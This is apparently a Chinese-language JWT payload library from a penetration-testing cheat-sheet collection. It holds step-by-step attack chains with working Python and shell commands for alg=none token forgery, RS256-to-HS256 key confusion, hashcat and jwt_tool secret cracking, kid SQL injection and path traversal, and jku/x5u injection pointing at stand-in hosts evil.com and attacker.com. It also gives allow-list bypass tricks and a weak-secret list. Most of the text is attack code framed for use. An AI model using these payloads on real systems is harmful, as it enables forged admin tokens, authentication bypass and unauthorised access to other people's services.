# JWT payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖:JWT 认证漏洞通论 + alg=none + RS→HS 密钥混淆 + 密钥爆破 + jku/x5u/kid 头注入。任何见到 `eyJ` 开头三段式 token 都先用本文件套一遍。

---

### JWT认证漏洞  `auth-jwt`
利用JWT(JSON Web Token)实现缺陷伪造或篡改认证令牌，实现未授权访问或权限提升
子类：**JWT** · tags: `auth` `jwt` `token`

**前置条件：** 目标使用JWT进行认证；可以获取或拦截JWT令牌；JWT库存在已知漏洞或服务端配置不当

**攻击链：**

**1. JWT解码与分析**
_解码JWT的Header和Payload分析其结构和权限信息_
```
# 手动解码JWT (Base64)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" | cut -d. -f2 | base64 -d 2>/dev/null

# 使用jwt_tool解码:
python3 jwt_tool.py <token>

# 在线解码:
# https://jwt.io/

# 检查关键字段:
# - alg: 签名算法(HS256/RS256/none)
# - kid: 密钥ID(可能可注入)
# - typ: 令牌类型
# - exp: 过期时间
# - role/admin/isAdmin: 权限字段
```

**2. Algorithm None攻击**
_将JWT的alg字段设为none，使服务端跳过签名验证，直接接受篡改的payload_
```
# 将alg改为none绕过签名验证
import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "admin", "iat": 1700000000, "exp": 1999999999}

h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=")
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=")

# 多种变体绕过:
alg_variants = ["none", "None", "NONE", "nOnE"]
for alg in alg_variants:
    header["alg"] = alg
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=")
    token = h.decode() + "." + p.decode() + "."
    print(f"alg={alg}: {token}")

# 使用jwt_tool:
python3 jwt_tool.py <token> -X a  # Algorithm None attack
```

**3. HS256密钥爆破**  _[linux]_
_对使用HS256对称加密的JWT进行密钥字典爆破_
```
# 使用jwt_tool爆破弱密钥
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# 使用hashcat:
hashcat -m 16500 jwt_hash.txt /usr/share/wordlists/rockyou.txt

# 使用john:
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# 常见弱密钥:
# secret, password, 123456, admin, key, test
# 公司名, 项目名, 域名等

# 密钥确认后伪造JWT:
import jwt
token = jwt.encode({"user":"admin","role":"admin"}, "found_secret", algorithm="HS256")
print(token)
```

**4. RS256→HS256算法混淆攻击**  _[linux]_
_利用RS256/HS256算法混淆，用公钥作为HS256对称密钥签名伪造JWT_
```
# 当服务端使用RS256但接受HS256时:
# 1. 获取服务端公钥(通常在/.well-known/jwks.json或/api/keys)
curl -s "http://target.com/.well-known/jwks.json"
curl -s "http://target.com/api/v1/keys"

# 2. 提取公钥
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > pubkey.pem

# 3. 用公钥作为HS256的密钥签名JWT
import jwt
public_key = open("pubkey.pem").read()
token = jwt.encode(
    {"user": "admin", "role": "admin"},
    public_key,
    algorithm="HS256"
)
print(token)

# 使用jwt_tool:
python3 jwt_tool.py <token> -X k -pk pubkey.pem  # Key confusion attack
```

**5. KID参数注入**
_利用JWT头部kid字段的SQL注入或路径遍历控制签名验证密钥_
```
# KID (Key ID) SQL注入:
# 原始header: {"alg":"HS256","kid":"key1"}
# 注入header: {"alg":"HS256","kid":"key1' UNION SELECT 'ATTACKER_SECRET' -- "}

import jwt, json, base64

# SQL注入方式:
header = {"alg": "HS256", "kid": "x' UNION SELECT 'test' -- "}
token = jwt.encode({"user": "admin"}, "test", algorithm="HS256", headers=header)

# 路径遍历方式:
header2 = {"alg": "HS256", "kid": "../../dev/null"}
# /dev/null内容为空，密钥为空字符串
token2 = jwt.encode({"user": "admin"}, "", algorithm="HS256", headers=header2)

# 使用jwt_tool:
python3 jwt_tool.py <token> -X i -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

**WAF/EDR 绕过变体：**

**1. JWK/JKU头部密钥注入**
_通过JWT Header中的jwk字段内嵌攻击者公钥或jku字段指向攻击者的JWKS端点，使服务端使用攻击者控制的密钥验证签名_
```
# JWK内嵌密钥注入:
# 生成RSA密钥对:
openssl genrsa -out attacker.key 2048
openssl rsa -in attacker.key -pubout -out attacker.pub

# 构造JWT Header:
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"<attacker_n_base64>","e":"AQAB","use":"sig"}}
# 用attacker.key签名，服务端从jwk字段取公钥验证

# JKU远程密钥注入:
{"alg":"RS256","jku":"http://attacker.com/jwks.json"}
# 在attacker.com上部署包含攻击者公钥的JWKS文件

# 使用jwt_tool:
python3 jwt_tool.py <token> -X s -pr attacker.key
```

**2. 算法降级与嵌套令牌利用**
_利用RS256到HS256的算法混淆攻击(用公钥作对称密钥签名)，或在JWT Payload中嵌入伪造的内部JWT令牌触发递归解析漏洞_
```
# 算法降级(RS256→HS256):
# 获取服务端公钥后用作HS256密钥:
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > pub.pem
python3 -c "
import jwt
pub = open('pub.pem').read()
token = jwt.encode({'user':'admin','role':'admin'}, pub, algorithm='HS256')
print(token)"

# Claim篡改+嵌套JWT:
# 在JWT payload中嵌入另一个JWT:
{"user":"admin","inner_token":"<另一个伪造的JWT>"}
# 某些系统会递归解析inner_token
```

---

### · JWT安全

### JWT None算法攻击  `jwt-none-attack`
利用JWT库对"none"算法的支持缺陷，将JWT头部的签名算法修改为none后移除签名部分，构造无需密钥即可通过验证的伪造令牌。这是最经典的JWT漏洞之一。
子类：**算法攻击** · tags: `JWT` `none算法` `认证绕过` `令牌伪造` `CVE-2015-2951`

**前置条件：** 目标使用JWT进行身份认证；jwt_tool或Python PyJWT库

**攻击链：**

**1. 1. 解码现有JWT**
_解析JWT的Header和Payload部分，识别算法和声明内容_
```
# 解码JWT的三个部分
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.signature" | cut -d. -f1 | base64 -d
# 输出: {"alg":"HS256","typ":"JWT"}

echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.signature" | cut -d. -f2 | base64 -d
# 输出: {"user":"guest","role":"user"}
```

**2. 2. 构造None算法JWT**
_Python脚本构造alg=none的伪造JWT，提权为admin_
```
import base64, json

# 修改Header为none算法
header = base64.urlsafe_b64encode(
    json.dumps({"alg":"none","typ":"JWT"}).encode()
).rstrip(b"=").decode()

# 修改Payload为admin
payload = base64.urlsafe_b64encode(
    json.dumps({"user":"admin","role":"admin"}).encode()
).rstrip(b"=").decode()

# 签名为空
forged_jwt = f"{header}.{payload}."
print(forged_jwt)
```

**3. 3. jwt_tool自动攻击**
_使用jwt_tool自动化测试none算法及其大小写变体_
```
python3 jwt_tool.py {TOKEN} -X a

# -X a = 尝试none算法攻击
# 同时测试多种none变体
# none, None, NONE, nOnE, noNe
```

**4. 4. 验证伪造令牌**
_使用伪造的JWT访问管理员接口验证攻击效果_
```
curl -s -H "Authorization: Bearer {FORGED_JWT}" \
  "https://{TARGET}/api/admin/dashboard"

# 检查是否获得管理员权限
# 200 OK = 攻击成功
# 401/403 = 服务端正确拒绝none算法
```

**WAF/EDR 绕过变体：**

**1. none算法大小写变体**
_使用none的各种大小写组合和不同签名占位绕过校验_
```
# 各种none变体
{"alg":"none"}
{"alg":"None"}
{"alg":"NONE"}
{"alg":"nOnE"}
{"alg":"noNe"}
{"alg":"nONE"}

# 添加签名占位
header.payload.
header.payload.AA==
header.payload.e30=
```

---

### JWT密钥混淆攻击(RS→HS)  `jwt-key-confusion`
当服务端使用RSA公钥验证JWT时，攻击者将算法从RS256改为HS256，此时服务端会错误地使用RSA公钥作为HMAC密钥进行验证。由于RSA公钥是公开的，攻击者可用它签名任意JWT。
子类：**算法攻击** · tags: `JWT` `密钥混淆` `RS256` `HS256` `算法篡改`

**前置条件：** 目标JWT使用RS256/RS384/RS512算法；已获取RSA公钥；jwt_tool或Python

**攻击链：**

**1. 1. 获取RSA公钥**
_从JWKS端点、API或SSL证书中获取RSA公钥_
```
# 常见公钥泄露位置
curl -s "https://{TARGET}/.well-known/jwks.json" | jq
curl -s "https://{TARGET}/api/keys" | jq
curl -s "https://{TARGET}/oauth/discovery" | jq

# 从JWKS中提取公钥
# 或从SSL证书中获取
openssl s_client -connect {TARGET}:443 | openssl x509 -pubkey -noout > pubkey.pem
```

**2. 2. 密钥混淆攻击**
_Python脚本将RSA公钥作为HMAC密钥签名伪造JWT_
```
import jwt
import json

# 读取RSA公钥
with open("pubkey.pem", "rb") as f:
    public_key = f.read()

# 用公钥作为HMAC密钥签名
forged_payload = {
    "user": "admin",
    "role": "admin",
    "iat": 1707811200,
    "exp": 1999999999
}

# 将算法从RS256切换为HS256
forged_token = jwt.encode(
    forged_payload,
    public_key,        # RSA公钥作为HMAC密钥
    algorithm="HS256"  # 改为HMAC算法
)
print(forged_token)
```

**3. 3. jwt_tool自动攻击**
_jwt_tool一键执行密钥混淆攻击_
```
python3 jwt_tool.py {TOKEN} -X k -pk pubkey.pem

# -X k = 密钥混淆攻击模式
# -pk = 指定公钥文件
# 工具自动完成RS256→HS256切换和签名
```

**4. 4. JWKS端点注入**
_JKU/X5U头注入使服务端从攻击者控制的URL获取验证密钥_
```
# 如果支持jku/x5u头，可注入自定义JWKS端点
Header: {
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://evil.com/.well-known/jwks.json"
}

# 在evil.com上托管攻击者生成的JWKS
# 服务端会从攻击者URL获取公钥进行验证
openssl genrsa -out attacker_key.pem 2048
openssl rsa -in attacker_key.pem -pubout > attacker_pub.pem
```

**WAF/EDR 绕过变体：**

**1. 多种公钥格式尝试**
_某些JWT库对公钥格式处理不同，尝试多种格式_
```
# PEM格式(标准)
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqh...
-----END PUBLIC KEY-----

# DER格式(二进制)
openssl rsa -pubin -in pubkey.pem -outform DER -out pubkey.der

# 带/不带换行符
cat pubkey.pem | tr -d "\n" > pubkey_noline.pem

# 不同编码的公钥作为HMAC密钥
```

---

### JWT密钥爆破  `jwt-secret-bruteforce`
当JWT使用HMAC对称算法(HS256/HS384/HS512)且密钥为弱密码时，可通过字典或暴力破解还原签名密钥，进而伪造任意JWT令牌。
子类：**密钥破解** · tags: `JWT` `密钥爆破` `HS256` `弱密钥` `hashcat`

**前置条件：** 目标JWT使用HMAC算法(HS256等)；已获取有效JWT样本；hashcat或jwt_tool

**攻击链：**

**1. 1. 确认算法和结构**
_确认JWT使用HMAC对称算法，此类算法的密钥可被爆破_
```
# 解码JWT Header
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d
# {"alg":"HS256"}

# 确认是HMAC对称算法才可爆破
# HS256 / HS384 / HS512 = 可爆破
# RS256 / ES256 = 不可直接爆破密钥
```

**2. 2. hashcat GPU加速爆破**
_hashcat GPU加速破解JWT HMAC密钥_
```
# hashcat模式16500 = JWT
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt

# jwt.txt内容为完整的JWT字符串
# eyJhbGci....signature

# 使用规则加速
hashcat -m 16500 -a 0 jwt.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 掩码暴力破解(8位数字密钥)
hashcat -m 16500 -a 3 jwt.txt ?d?d?d?d?d?d?d?d
```

**3. 3. jwt_tool字典爆破**
_jwt_tool字典模式破解JWT密钥_
```
python3 jwt_tool.py {TOKEN} -C -d /usr/share/wordlists/rockyou.txt

# -C = 开启字典破解模式
# -d = 指定字典文件
# 也支持常见弱密钥快速测试
python3 jwt_tool.py {TOKEN} -C -d common_jwt_secrets.txt
```

**4. 4. 使用破解密钥伪造JWT**
_使用破解出的密钥签名伪造管理员JWT_
```
import jwt

secret = "cracked_secret_key"

forged = jwt.encode(
    {"user": "admin", "role": "superadmin", "exp": 1999999999},
    secret,
    algorithm="HS256"
)
print(f"Forged JWT: {forged}")

# 验证
curl -H "Authorization: Bearer $FORGED_JWT" "https://{TARGET}/api/admin"
```

**WAF/EDR 绕过变体：**

**1. 常见默认JWT密钥**
_优先尝试常见的默认/弱JWT密钥_
```
# 常见弱密钥列表
secret
password
123456
hs256-secret
jwt-secret
my-secret-key
changeme
default
qwerty
super-secret
your-256-bit-secret
secretkey
token-secret
application-secret
```

---

### JWT JKU/X5U头注入  `jwt-jku-x5u-injection`
利用JWT Header中的jku(JWK Set URL)或x5u(X.509 URL)参数，将密钥来源指向攻击者控制的服务器，使服务端使用攻击者的公钥验证JWT，从而实现令牌伪造。
子类：**Header注入** · tags: `JWT` `JKU` `X5U` `Header注入` `JWKS` `密钥劫持`

**前置条件：** 目标JWT支持jku/x5u Header参数；攻击者拥有公网服务器；Python环境

**攻击链：**

**1. 1. 探测JKU/X5U支持**
_检查JWT是否使用jku/x5u头以及目标JWKS端点_
```
# 解码JWT Header查看是否包含jku/x5u
echo "{JWT_HEADER}" | base64 -d | jq

# 常见原始Header
{"alg":"RS256","typ":"JWT","jku":"https://target.com/.well-known/jwks.json"}

# 检查JWKS端点
curl -s "https://{TARGET}/.well-known/jwks.json" | jq
curl -s "https://{TARGET}/.well-known/openid-configuration" | jq .jwks_uri
```

**2. 2. 生成攻击者密钥对**
_生成攻击者的RSA密钥对并构造JWKS文件_
```
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import json, base64

# 生成RSA密钥对
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# 导出PEM格式
with open("attacker_private.pem", "wb") as f:
    f.write(private_key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption()
    ))

# 生成JWKS格式公钥
numbers = public_key.public_numbers()
jwks = {"keys": [{"kty": "RSA", "kid": "attacker-key-1",
    "n": base64.urlsafe_b64encode(numbers.n.to_bytes(256, "big")).rstrip(b"=").decode(),
    "e": base64.urlsafe_b64encode(numbers.e.to_bytes(3, "big")).rstrip(b"=").decode(),
    "use": "sig", "alg": "RS256"}]}

with open("jwks.json", "w") as f:
    json.dump(jwks, f)
```

**3. 3. 托管JWKS并签名JWT**
_托管JWKS文件并用攻击者私钥签名JWT，jku指向攻击者服务器_
```
# 在攻击者服务器托管jwks.json
python3 -m http.server 8080
# http://evil.com:8080/jwks.json

import jwt

# 用攻击者私钥签名
with open("attacker_private.pem", "rb") as f:
    attacker_key = f.read()

forged = jwt.encode(
    {"user": "admin", "role": "admin", "exp": 1999999999},
    attacker_key,
    algorithm="RS256",
    headers={"jku": "http://evil.com:8080/jwks.json", "kid": "attacker-key-1"}
)
print(forged)
```

**4. 4. 验证攻击**
_使用注入了jku的伪造JWT访问管理员接口_
```
curl -s -H "Authorization: Bearer {FORGED_JWT}" \
  "https://{TARGET}/api/admin/users" | jq

# 服务端流程：
# 1. 解析JWT Header中的jku URL
# 2. 从evil.com获取JWKS公钥
# 3. 用攻击者公钥验证签名——通过!
# 4. 信任Payload中的admin身份
```

**WAF/EDR 绕过变体：**

**1. JKU URL绕过限制**
_利用开放重定向、子域名接管、URL混淆绕过jku域名白名单_
```
# 开放重定向绕过域名白名单
{"jku": "https://target.com/redirect?url=https://evil.com/jwks.json"}

# 子域名接管
{"jku": "https://abandoned.target.com/.well-known/jwks.json"}

# URL混淆
{"jku": "https://target.com@evil.com/jwks.json"}
{"jku": "https://evil.com#target.com/jwks.json"}
{"jku": "https://evil.com/.well-known/jwks.json?.target.com"}
```

---


---

← 回 [00-index.md](00-index.md) · 相关:[`10-oauth-redirect.md`](10-oauth-redirect.md)(OAuth token 经常是 JWT)
